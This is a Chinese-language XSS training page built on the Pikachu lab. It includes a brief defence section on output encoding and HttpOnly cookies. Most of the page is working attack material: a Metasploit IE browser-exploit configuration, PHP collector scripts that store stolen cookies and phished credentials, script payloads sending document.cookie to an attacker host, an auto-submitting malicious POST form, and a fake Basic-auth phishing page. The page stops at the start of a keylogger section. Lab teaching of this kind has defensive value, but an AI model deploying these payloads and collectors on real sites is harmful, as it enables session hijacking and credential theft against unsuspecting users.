<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps89.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps90.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps91.jpg" alt="img"> </p>
<h3 id="6-3-利用beef-msf拿用户shell（基于客户端使用ie789"><a href="#6-3-利用beef-msf拿用户shell（基于客户端使用ie789" class="headerlink" title="6.3 利用beef+msf拿用户shell（基于客户端使用ie789 )"></a><strong>6.3 利用beef+msf拿用户shell（基于客户端使用ie789 )</strong></h3><p>操作方法同上，只是利用的漏洞不一样，这里就不演示了，只是给出msf相关的配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/browser/***\*ie_execcommand_uaf\**** </span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set srvport 7777</span><br><span class="line"></span><br><span class="line">srvport =&gt; 7777</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set uripath </span><br><span class="line"></span><br><span class="line">uripath =&gt; </span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; run</span><br></pre></td></tr></table></figure>

<h2 id="七、XSS的防御"><a href="#七、XSS的防御" class="headerlink" title="七、XSS的防御"></a><strong>七、XSS的防御</strong></h2><p>XSS防御的总体思路是：对用户的输入(和URL参数)进行过滤，对输出进行html编码。也就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。</p>
<p>对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p>
<p>对输出进行html编码，就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。</p>
<p>如下，是使用php中的htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</p>
<p>#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</p>
<p>$name &#x3D; htmlspecialchars( $_GET[ ‘name’ ] );</p>
<p>如下，图一是没有进行html编码的，图2是进行了html编码的。经过html编码后script标签被当成了html实体</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps92.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps93.jpg" alt="img"> </p>
<p>我们还可以服务端设置会话Cookie的HTTP Only属性，这样，客户端的JS脚本就不能获取Cookie信息了</p>
<p><em><strong>*修复总结*</strong></em></p>
<p>因为XSS漏洞涉及输入和输出两部分，所以其修复也分两种</p>
<p>A:过滤输入的数据，包括” ‘ ”,” “ ”,”&lt;”,”&gt;” “on*”等非法字符。</p>
<p>B:对输出到页面的数据进行相应的编码转换，包括HTML实体编码、JavaScript编码等。</p>
<h2 id="O-课程小结"><a href="#O-课程小结" class="headerlink" title="Ø 课程小结"></a>Ø <strong>课程小结</strong></h2><p>在本课中我们学习了XSS漏洞的原理、XSS漏洞的类型以及危害，我们需要具备XSS漏洞的挖掘与利用能力。</p>
<h2 id="一、XSS漏洞盗取cookie实战"><a href="#一、XSS漏洞盗取cookie实战" class="headerlink" title="一、XSS漏洞盗取cookie实战"></a>一、<strong>XSS漏洞盗取cookie实战</strong></h2><h2 id="实验一：XSS平台搭建及后台使用（盗取cookie）"><a href="#实验一：XSS平台搭建及后台使用（盗取cookie）" class="headerlink" title="实验一：XSS平台搭建及后台使用（盗取cookie）"></a><strong>实验一：XSS平台搭建及后台使用（盗取cookie）</strong></h2><h3 id="1-XSS平台搭建及后台使用"><a href="#1-XSS平台搭建及后台使用" class="headerlink" title="1. XSS平台搭建及后台使用"></a>1. <strong>XSS平台搭建及后台使用</strong></h3><p>  访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/pkxss/%E8%BF%9B%E8%A1%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E3%80%82">http://127.0.0.1/pikachu/pkxss/进行初始化。</a></p>
<p>将pikachu目录下的pkxss文件夹复制到攻击机上，并修改如下代码：</p>
<p>（1）修改数据库连接</p>
<p>修改inc目录下的config.inc.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全局session_start</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">//全局居设置时区</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//全局设置默认字符</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<span class="comment">//定义数据库连接参数</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBHOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);<span class="comment">//将localhost修改为数据库服务器的地址</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBUSER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);<span class="comment">//将root修改为连接mysql的用户名</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPW&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);<span class="comment">//将root修改为连接mysql的密码</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBNAME&#x27;</span>, <span class="string">&#x27;pkxss&#x27;</span>);<span class="comment">//自定义，建议不修改</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DBPORT&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);<span class="comment">//将3306修改为mysql的连接端口，默认tcp3306</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（2）修改xcookie目录下的cookie.php文件（文件中的代码是用来获取用户的cookie）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个是获取cookie的api页面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$ipaddress</span>=<span class="title function_ invoke__">getenv</span> (<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span>=<span class="string">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ipaddress</span>&#x27;,&#x27;<span class="subst">$cookie</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://192.168.149.128/pikachu/index.php&quot;</span>);<span class="comment">//重定向到一个可信的网站</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（3）登录XSS平台</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps94.jpg" alt="img"> </p>
<p>获取cookie的php文件是：<a target="_blank" rel="noopener" href="http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php">http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php</a></p>
<h3 id="2-盗取cookie"><a href="#2-盗取cookie" class="headerlink" title="2. 盗取cookie"></a>2. <strong>盗取cookie</strong></h3><p>盗取用户信息的页面：<a target="_blank" rel="noopener" href="http://192.168.100.150/pikachu/pkxss/xcookie/cookie.php">http://192.168.100.150/pikachu/pkxss/xcookie/cookie.php</a></p>
<p>存在XSS漏洞的页面URL：<a target="_blank" rel="noopener" href="http://192.168.100.150/pikachu/vul/xss/xss_stored.php">http://192.168.100.150/pikachu/vul/xss/xss_stored.php</a></p>
<p>XSS平台页面：</p>
<p>（1）测试是否存在XSS漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps95.jpg" alt="img"> </p>
<p>（2）构造盗取cookie的语句并点击提交</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=<span class="string">&#x27;http://192.168.100.150/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span>+ document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>（3）查看获取的cookie信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps96.jpg" alt="img"> </p>
<h2 id="实验二：反射型XSS（POST）获取cookie"><a href="#实验二：反射型XSS（POST）获取cookie" class="headerlink" title="实验二：反射型XSS（POST）获取cookie"></a><strong>实验二：反射型XSS（POST）获取cookie</strong></h2><p>POST请求方式的XSS攻击其实是比较难实现的，因为要构造一个网页html文件出来</p>
<p>POST攻击利用页面：&#x2F;pkxss&#x2F;xcookie&#x2F;post.html</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/pkxss/xcookie/post.html">http://127.0.0.1/pkxss/xcookie/post.html</a></p>
<p>首先要【以test用户（密码abc123）】登录到网站，找到存在XSS漏洞的页面，并根据页面创建一个html文件（已经存在：&#x2F;pkxss&#x2F;xcookie&#x2F;post.html）。根据网站页面对文件做如下修改：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;  <span class="comment">//当浏览器加载完页面所有的内容后自动触发执行</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.149.128/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=</span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  <span class="string">&quot;&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag"></span></span></span><br><span class="line"><span class="string"><span class="tag">document.location = &#x27;http://192.168.149.128/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span></span></span><br><span class="line"><span class="string"><span class="tag"></span></span></span><br><span class="line"><span class="string"><span class="tag"> &lt;/script&gt;&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">document.write(&#x27;&lt;img src=&quot;http://127.0.0.1/antxss/xcookie/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot; /&gt;&#x27;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;/script&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">document.location = &#x27;http://127.0.0.1/antxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;/script&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后将这个页面的访问地址发给用户，一旦用户以管理员admin登录，并点击了这个页面，那么他的cookie就会被盗。如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps97.jpg" alt="img"> </p>
<h2 id="二、XSS钓鱼用户名和密码"><a href="#二、XSS钓鱼用户名和密码" class="headerlink" title="二、XSS钓鱼用户名和密码"></a>二、<strong>XSS钓鱼用户名和密码</strong></h2><p>在pikachu\pkxss\xfish目录下有一个fish.php的钓鱼页面，代码如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump($_SERVER);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送认证框，并给出迷惑性的info</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://192.168.100.150/pikachu/pkxss/xfish/xfish.php?username=<span class="subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span>&amp;&amp;password=<span class="subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在pikachu\pkxss\xfish目录下有一个xfish.php页面，用于将从钓鱼页面获取的用户及密码存储到数据库中，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$referer</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$referer</span>.=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$query</span>=<span class="string">&quot;insert fish(time,username,password,referer) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们在有存储型XSS的页面中构造以下Payload，然后其他用户访问该页面时就会提示输入用户名和密码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.100.150/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps98.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps99.jpg" alt="img"> </p>
<p>当用户输入用户名和密码登录后，刚才输入的用户名和密码就会被窃取，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps100.jpg" alt="img"> </p>
<h2 id="三、XSS获取键盘记录"><a href="#三、XSS获取键盘记录" class="headerlink" title="三、XSS获取键盘记录"></a>三、<strong>XSS获取键盘记录</strong></h2><p>参考文档：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/escwq/p/12604447.html">https://www.cnblogs.com/escwq/p/12604447.html</a></p>
<p>在pikachu\pkxss\rkeypress目录下有一个获取解盘信息的rk.js文件，其代码如下所示：</p>
